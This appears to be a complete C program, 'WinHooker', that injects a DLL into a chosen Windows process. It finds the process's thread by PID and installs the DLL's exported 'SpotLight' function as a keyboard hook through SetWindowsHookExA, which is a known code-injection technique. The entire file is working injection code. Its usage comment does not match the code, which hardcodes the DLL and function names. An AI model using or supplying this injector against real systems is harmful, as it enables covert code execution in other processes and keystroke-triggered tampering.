// WinHooker - Use SetWindowsHookEx function to hook a Dll with exported function once keyboard stroke detected by the system
// Usage - WinHooker.exe <DLL_NAME> <FUNC_NAME>

#include <stdio.h>
#include <Windows.h>

HWND g_HWND = NULL;
DWORD tid = NULL;

int CALLBACK EnumWindowsProcMy(HWND hwnd, LPARAM lParam) {

    DWORD lpdwProcessId;
    tid = GetWindowThreadProcessId(hwnd, &lpdwProcessId);
    if (lpdwProcessId == lParam)
    {
        g_HWND = hwnd;
        return FALSE;
    }
    return TRUE;

}

int main(){

    int dTargetPID = 0;
    char procName[1024];

    printf("[*] Enter PID: ");
    scanf_s("%d", &dTargetPID);

    EnumWindows(EnumWindowsProcMy, dTargetPID);

    //HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dTargetPID);

    if (g_HWND == NULL) {

        printf("[!] Failed retreiving Window Handle\n");
        return 1;
    }

    printf("[+] Window Handle and Main Thread has been retreived\n");

    HMODULE dll = LoadLibraryEx(L"InjDLL_NoSC.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);;

    if (dll == NULL) {

        printf("[!] Cannot find the module\n");

        getchar();
        
        return 1;

    }

    printf("[+] Check if module is loaded into the memory and press enter\n");
    getchar();

    // Getting the function address
    HOOKPROC addr = (HOOKPROC)GetProcAddress(dll, "SpotLight");

    if (addr == NULL) {

        printf("[!] Cannot find the funtion\n");

        getchar();

        return 1;

    }

    // Setting Hook
    HHOOK handle = SetWindowsHookExA(WH_KEYBOARD, addr, dll, tid);

    if (handle == NULL) {

        printf("[!] Failed to set hook");

        return 1;

    }

    printf("[+] Program successfully hooked\n");

    system("pause");

    if (UnhookWindowsHookEx(handle) == FALSE) {

        printf("[!] Failed to remove the hook");
        return EXIT_FAILURE;

    }

    return 0;

}
